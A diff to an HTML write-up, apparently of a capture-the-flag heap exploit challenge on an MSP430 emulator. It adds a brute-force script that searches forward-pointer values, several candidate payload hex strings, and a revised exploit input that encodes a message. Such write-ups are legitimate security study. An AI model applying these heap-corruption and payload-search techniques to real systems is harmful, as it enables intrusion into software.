@@ -2863,8 +2863,7 @@ CPUOFF flag set; program no longer running. CPU must now be reset.
 <p>With that exploit, subsequent calls to <code>free</code> do not update the above two words. There must be some difference between these two exploits to result in this behavior. The back pointer and ROP gadgets have not changed, so the only difference between the two is the forward pointer and the size.</p>
 
 <h5>Length: 61 bytes</h5>
-<pre><code>
-6e000000f0
+<pre><code>6e000000f0
 6e000000e0
 6e000000d0
 6e000000c0
@@ -3814,7 +3813,7 @@ CPUOFF flag set; program no longer running. CPU must now be reset.
                                     └────────┴────────┴────────┘
 </code></pre>
 
-<p>The stack location is technically just another chunk resident in the linked list—although it is only single-linked rather than double-linked.</p>
+<p>The stack location is <em>technically</em> just another chunk resident in the linked list—although it is only single-linked rather than double-linked.</p>
 
 <pre><code class='language-ascii-noshadows'>                ┌──────────────────────────┐  
                 │           HEAP           │  
@@ -4920,6 +4919,24 @@ def bruteforce():
 &gt;&gt;&gt; bruteforce()
 </code></pre>
 
+<h3>Alternate Solutions</h3>
+
+<p>While this tool does not find any working fifty-eight byte exploits, there are at least two other valid fifty-nine byte ones.</p>
+
+<pre><code>for i in range(0x0000, 0xFFFF):
+    fd = binascii.hexlify(i.to_bytes(2, "big")).decode()
+    check_and_run('e63d' + fd)
+</code></pre>
+
+<pre><code>$ cat candidates.txt
+e63d<mark>3a53</mark>
+e63d5851
+e63d<mark>b851</mark>
+</code></pre>
+
+<p><b>Chronology note:</b> The original forward pointer (<code>0x5158</code>) was discovered via manual analysis rather than bruteforcing; the above script was written afterward.</p>
+
+
 <h3>Conclusion</h3>
 
 <p>Barring a significant breakthrough in understanding, crafting a 58-byte exploit and beating the record seems impossible. It is possible to continue to optimize using more advanced techniques like memory snapshots or symbolic execution, but this would require more advanced tooling. As it stands, this may be the limit of what any <em>sane</em> individual can accomplish.</p>
@@ -5028,12 +5045,7 @@ b&apos;<mark>69732e67642f6d757a6170</mark>&apos;
 
 <h3>A Different Kind Of Record</h3>
 
-<p>As long as the data is small enough, it is possible to use the above techniques to encode arbitrary information. A short email address could theoretically fit.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
-
-<input type="checkbox" id="sn-1" class="sidenote-toggle" />
-<span class="sidenote">
-	Or a Signal username.
-</span></p>
+<p>As long as the data is small enough, it is possible to use the above techniques to encode arbitrary information.</p>
 
 <blockquote>
 We choose to go to the Moon in this decade and do the other things, not because they are easy, but because they are hard; because that goal will serve to organize and measure the best of our energies and skills, because that challenge is one that we are willing to accept, one we are unwilling to postpone, and one we intend to win.
@@ -5042,16 +5054,16 @@ We choose to go to the Moon in this decade and do the other things, not because 
 </blockquote>
 
 <pre><code>6e
-6e000000f0
-6e006a00e0
-6e006100d0
-6e006d00c0
-6e006500e63d5851
-6e00730045
-6e002e0076
-6e00350065
-6e00390072
-6e00000079
+6e006200f0
+6e003900e0
+6e006500d0
+6e006b00c0
+6e004000e63d5851
+6e00700045
+6e006d0076
+6e002e0065
+6e006d0072
+6e00650079
 6e002e4d7f
 </code></pre>
 
